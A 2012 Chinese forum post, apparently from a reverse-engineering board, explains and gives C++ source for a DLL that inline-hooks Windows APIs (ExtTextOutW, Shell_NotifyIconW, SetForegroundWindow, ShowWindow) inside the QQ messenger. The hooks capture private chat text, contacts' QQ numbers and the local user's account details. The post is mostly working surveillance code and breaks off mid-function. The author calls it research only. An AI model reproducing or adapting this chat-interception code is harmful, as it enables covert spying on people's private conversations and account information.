
# [原创]另类得到QQ聊天信息，支持所有的QQ版本

标题: 原创】另类得到QQ聊天信息，支持所有的QQ版本
作者: fbbttfbb
时间: 2012-03-31,17:30:40
目的: 只是研究，无其它

得到QQ聊天内容的有许多方法，有通过QQ接口得到，也可以通过COM接口得到，现在用另一种方法得到QQ聊天信息，我们知道QQ2008版本的聊天信息我们可以通过向QQ聊天对话框的`rich`窗口发送消息得到内容，但2009聊天内容，就不能了，因为并不是标准的控件。所以我们现在用HOOK `ExtTextOutW` API来得到QQ聊天内容，经过逆向QQ，发现新版本的QQ(包括QQ2010,2011,2012)的聊天内容，都是放在一块内存块里，那么我们只要得到了这个内存地址，就可以得到聊天内容了，至于如何得到这块内存址址，这时就用到了HOOK `ExtTextOutW`做为入口，在QQ聊天窗口每次显示时，都会调用`ExtTextOutW`函数，并且会传入这块内存地址，并且从`ExtTextOutW`里也可以得到聊天对象的QQ号等,现在我们QQ聊天内容和聊天对象的QQ号都知道了。接着我们可以通过HOOK `Shell_NotifyIconW`来得到本机的QQ号和昵称,有了本机的QQ信息，这样信息基本上是完整了好了，废话不多说直接上代码

```cpp
#include "stdafx.h"
#include <windows.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <stdio.h>
#include <string>
#include <AtlBase.h>
#include <assert.h>
using namespace std;

//---------------inline hook Shell_NotifyIconW--------------------------
BOOL WINAPI MyShell_NotifyIconW( DWORD dwMessage,
                PNOTIFYICONDATAW lpdata
                );
typedef BOOL (WINAPI *PFNMyShell_NotifyIconW)(DWORD,PNOTIFYICONDATAW);
char szOldShell_NotifyIconW[5] = {0};
char szJmpMyShell_NotifyIconW[5] = {(char)0xe9};
PFNMyShell_NotifyIconW pShell_NotifyIconW = NULL;
//-----------------------------------------------------------------------

//------------------------inline hook SetForegroundWindow-------------------------
BOOL WINAPI MySetForegroundWindow(
              HWND hWnd
              );
typedef BOOL (WINAPI *PFNSetForegroundWindow)(HWND);
char szOldSetForegroundWindow[5] = {0};
char szJmpMySetForegroundWindow[5] = {(char)0xe9};
PFNSetForegroundWindow pSetForegroundWindow = NULL;
//--------------------------------------------------------------------------

//------------------------inline hook ShowWindow-------------------------
BOOL WINAPI MyShowWindow(
             HWND hWnd,
             int nCmdShow
                  );
typedef BOOL (WINAPI *PFNShowWindow)(HWND,int);
char szOldShowWindow[5] = {0};
char szJmpMyShowWindow[5] = {(char)0xe9};
PFNShowWindow pShowWindow = NULL;
//--------------------------------------------------------------------------

//------------------------inline hook ExtTextOutW---------------------------------
 BOOL WINAPI MyExtTextOutW(  HDC hdc,          // handle to DC
                    int X,            // x-coordinate of reference point
                    int Y,            // y-coordinate of reference point
                    UINT fuOptions,   // text-output options
                    CONST RECT* lprc, // optional dimensions
                    LPCWSTR lpString, // string
                    UINT cbCount,     // number of characters in string
                    CONST INT* lpDx   // array of spacing values
                    );
typedef BOOL (WINAPI *PFNExtTextOutW)(  HDC hdc,          // handle to DC
                    int X,            // x-coordinate of reference point
                    int Y,            // y-coordinate of reference point
                    UINT fuOptions,   // text-output options
                    CONST RECT* lprc, // optional dimensions
                    LPCWSTR lpString, // string
                    UINT cbCount,     // number of characters in string
                    CONST INT* lpDx   // array of spacing values
                    );
char szOldExtTextOutW[5] = {0};
char szJmpMyExtTextOutW[5] = {(char)0xe9};
PFNExtTextOutW pExtTextOutW= NULL;
//----------------------------------------------------------------------------------

wstring g_wstrlocaluserinfo;//本地用户信息
bool g_bETOLastTime = false;
DWORD dwlaststringaddr=0;
DWORD dwLaststringLen = 0;
DWORD dwRectLeft = -1;
DWORD dwRectRight = -1;
HWND GetForeGroundWindowTitle(wstring &wstrtitle);

BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
           )
{
    switch (ul_reason_for_call)
  {
    case DLL_PROCESS_ATTACH:
      {
        /*
         inline hook ExtTextOutW 得到聊天内容，和聊天对象QQ号
        */
        DWORD dwJmpAddr = 0;
        HMODULE hModule = LoadLibrary("gdi32.Dll");
        pExtTextOutW = (PFNExtTextOutW)GetProcAddress(hModule, "ExtTextOutW");
        if(pExtTextOutW)
        {
          dwJmpAddr = (DWORD)MyExtTextOutW - (DWORD)pExtTextOutW - 5;
          memcpy(szJmpMyExtTextOutW + 1, &dwJmpAddr, 4);
          FreeLibrary(hModule);
          ReadProcessMemory((void*)-1, pExtTextOutW, szOldExtTextOutW, 5, NULL);//读出原来的前5个字节
          WriteProcessMemory((void*)-1, pExtTextOutW, szJmpMyExtTextOutW, 5, NULL);//写入我们处理后的5个字节
        }
        /*
         inline hook Shell_NotifyIconW  得到本机QQ信息
        */
        dwJmpAddr = 0;
        hModule = LoadLibrary("Shell32.Dll");
        pShell_NotifyIconW = (PFNMyShell_NotifyIconW)GetProcAddress(hModule, "Shell_NotifyIconW");
        if(pShell_NotifyIconW)
        {
          dwJmpAddr = (DWORD)MyShell_NotifyIconW - (DWORD)pShell_NotifyIconW - 5;
          memcpy(szJmpMyShell_NotifyIconW + 1, &dwJmpAddr, 4);
          FreeLibrary(hModule);
          ReadProcessMemory((void*)-1, pShell_NotifyIconW, szOldShell_NotifyIconW, 5, NULL);//读出原来的前5个字节
          WriteProcessMemory((void*)-1, pShell_NotifyIconW, szJmpMyShell_NotifyIconW, 5, NULL);//写入我们处理后的5个字节
        }
        /*
         inline hook SetForegroundWindow
        */
        dwJmpAddr = 0;
        hModule = LoadLibrary("User32.Dll");
        pSetForegroundWindow = (PFNSetForegroundWindow)GetProcAddress(hModule, "SetForegroundWindow");
        if(pSetForegroundWindow)
        {
          dwJmpAddr = (DWORD)MySetForegroundWindow - (DWORD)pSetForegroundWindow - 5;
          memcpy(szJmpMySetForegroundWindow + 1, &dwJmpAddr, 4);
          FreeLibrary(hModule);
          ReadProcessMemory((void*)-1, pSetForegroundWindow, szOldSetForegroundWindow, 5, NULL);//读出原来的前5个字节
          WriteProcessMemory((void*)-1, pSetForegroundWindow, szJmpMySetForegroundWindow, 5, NULL);//
        }
        /*
         inline hook ShowWindow
        */
        dwJmpAddr = 0;
        hModule = LoadLibrary("User32.Dll");
        pShowWindow = (PFNShowWindow)GetProcAddress(hModule, "ShowWindow");
        if(pShowWindow)
        {
          dwJmpAddr = (DWORD)MyShowWindow - (DWORD)pShowWindow - 5;
          memcpy(szJmpMyShowWindow + 1, &dwJmpAddr, 4);
          FreeLibrary(hModule);
          ReadProcessMemory((void*)-1, pShowWindow, szOldShowWindow, 5, NULL);//读出原来的前5个字节
          WriteProcessMemory((void*)-1, pShowWindow, szJmpMyShowWindow, 5, NULL);//
        }
          }
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
    return TRUE;
}

BOOL WINAPI MyShell_NotifyIconW( DWORD dwMessage,
                PNOTIFYICONDATAW lpdata
                )
{
  //取QQ本地用户的QQ号
  DWORD dwWritten = 0;
  DWORD dwUnicode = 0xFEFF;
  HANDLE hFile=NULL;
  if(lstrlenW(lpdata->szTip)>10)
  {
    g_wstrlocaluserinfo = wstring(lpdata->szTip);
    OutputDebugStringW(L"本机QQ如下:\r\n");
    OutputDebugStringW(g_wstrlocaluserinfo.c_str());
    OutputDebugStringW(L"\r\n");
  }
  WriteProcessMemory((void*)-1, pShell_NotifyIconW, szOldShell_NotifyIconW, 5, NULL);
  BOOL bRet = Shell_NotifyIconW(dwMessage,lpdata);
  WriteProcessMemory((void*)-1, pShell_NotifyIconW, szJmpMyShell_NotifyIconW, 5, NULL);
  return bRet;
}

DWORD g_dwLastCount=0;
DWORD g_ELTime = 2000;//时间间隔默认为2秒
wstring g_strforegwintitle;
HWND g_hLastWnd = NULL;
bool  g_bsetforegwin = false;
HWND g_hWnd = NULL;

struct st_HWND_COUNT//打开QQ聊天窗口时,QQ调用SetForeGroundWindow与ShowWindow进行绑定
{
  HWND hWnd;
  bool bSetForeGWin;
  st_HWND_COUNT()
  {
    hWnd=NULL;
    bSetForeGWin=false;  //未调用SetForeGroundWindow
  }
};

st_HWND_COUNT  g_st_hwnd_count;

BOOL WINAPI MyShowWindow(
             HWND hWnd,
             int nCmdShow
```
